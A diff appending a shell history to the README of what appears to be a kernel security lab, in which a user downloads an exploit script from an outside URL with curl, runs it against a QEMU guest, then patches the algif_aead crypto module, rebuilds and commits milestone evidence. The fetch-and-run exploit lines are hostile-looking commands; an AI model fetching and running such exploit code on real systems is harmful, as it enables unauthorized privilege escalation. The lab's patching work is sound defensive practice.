@@ -134,3 +134,78 @@ Esta v2 incorpora los siguientes fixes respecto a la v1:
 - BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
 - BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
 - Workflow Actions: greps de verificación con `|| echo`, tolerantes
+
+
+history commands
+    1  make qemu 
+    2  apt update && apt install -y curl
+    3  curl -L https://copy.fail/exp -o copy_fail_exp.py
+    4  ls
+    5  make qemu
+    6  python3 copy_fail_exp.py
+    7  gh auth login
+    8  git push
+    9  make qemu
+   10  mkdir -p evidence
+   11  cp hito3.txt evidence/hito3_mitigation.txt
+   12  mkdir -p evidence
+   13  {   echo "=== HITO 3: MITIGACIÓN TEMPORAL ===";   echo "Fecha: $(date)";   echo "Hostname: $(hostname)";   echo "algif_aead mit
+   14  cat evidence/hito3_mitigation.txt
+   15  git add .
+   16  git commit -m "hito-3: mitigacion temporal aplicada"
+   17  git push
+   18  id 
+   19  cd kernel/linux/crypto
+   20  nano algif_aead.c
+   21  apt update && apt install -y nano
+   22  nano algif_aead.c
+   23  sed -i 's/rsgl_src, rsgl_src/tsgl_src, rsgl_dst/g' algif_aead.c
+   24  cd ..
+   25  mkdir -p /workspaces/copy-fail-challenge-B/patches
+   26  git diff crypto/algif_aead.c > /workspaces/copy-fail-challenge-B/patches/fix_algif_aead.patch
+   27  cd /workspaces/copy-fail-challenge-B
+   28  make patch
+   29  cd kernel
+   30  make
+   31  make bzImage
+   32  cd /workspaces/copy-fail-challenge-B/kernel/linux
+   33  make bzImage -j$(nproc)
+   34  cd /workspaces/copy-fail-challenge-B
+   35  make qemu
+   36  mkdir -p evidence
+   37  cp hito4.txt evidence/hito4_patched.txt
+   38  {   echo "=== HITO 4: PARCHE APLICADO ===";   echo "Fecha: $(date)";   echo "Kernel parcheado";   echo "Exploit neutralizado";t
+   39  git add .
+   40  git commit -m "hito-4: parche aplicado"
+   41  git tag -a hito-4 -m "kernel parcheado"
+   42  git push origin main --tags
+   43  less algif_aead.c
+   44  ls patches
+   45  cat patches/fix_algif_aead.patch
+   46  cat /workspaces/copy-fail-challenge-B/kernel/linux/crypto/algif_aead.c
+   47  grep -n "aead_request_set_crypt" /workspaces/copy-fail-challenge-B/kernel/linux/crypto/algif_aead.c
+   48  sed -i 's/aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src,/aead_request_set_crypt(\&areq->cra_u.aead_req, tsgl_src,/g' c
+   49  grep -n "aead_request_set_crypt" /workspaces/copy-fail-challenge-B/kernel/linux/crypto/algif_aead.c
+   50  cd /workspaces/copy-fail-challenge-B/kernel/linux
+   51  make bzImage -j$(nproc)
+   52  cd /workspaces/copy-fail-challenge-B
+   53  make qemu
+   54  mkdir -p evidence
+   55  {   echo "=== HITO 4: PARCHE APLICADO ===";   echo "Fecha: $(date)";   echo "Kernel parcheado";   echo "Exploit neutralizado";t
+   56  git add .
+   57  git commit -m "hito-4: parche aplicado"
+   58  git tag -a hito-4 -m "kernel parcheado"
+   59  git push origin main --tags
+   60  grep -n "aead_request_set_crypt" /workspaces/copy-fail-challenge-B/kernel/linux/crypto/algif_aead.c
+   61  nano REPORT.md
+   62  ID 
+   63  id
+   64  make qemu 
+   65  -sh: cd: can't cd to /workspaces/copy-fail-challenge-B: No such file or directory
+cd /workspaces/copy-fail-challenge-B
+exit}
+exit
+   66  cd /workspaces/copy-fail-challenge-B
+   67  make qemu
+   68  python3 copy_fail_exp.py
+   69  history 
